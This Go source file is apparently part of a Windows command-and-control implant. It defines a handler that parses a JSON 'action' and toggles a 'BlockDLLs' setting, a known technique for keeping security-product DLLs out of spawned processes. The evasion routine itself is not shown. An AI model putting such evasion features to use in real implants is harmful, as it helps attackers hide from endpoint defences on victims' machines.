//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
)

type BlockDllsParams struct {
	Action string `json:"action"`
}

func cmdBlockDlls(raw json.RawMessage) string {
	var p BlockDllsParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	enable := true
	if p.Action == "off" || p.Action == "disable" || p.Action == "false" {
		enable = false
	}

	if err := BlockDLLs(enable); err != nil {
		return fmt.Sprintf("error: %s", err.Error())
	}

	return fmt.Sprintf("BlockDLLs set to %v", enable)
}
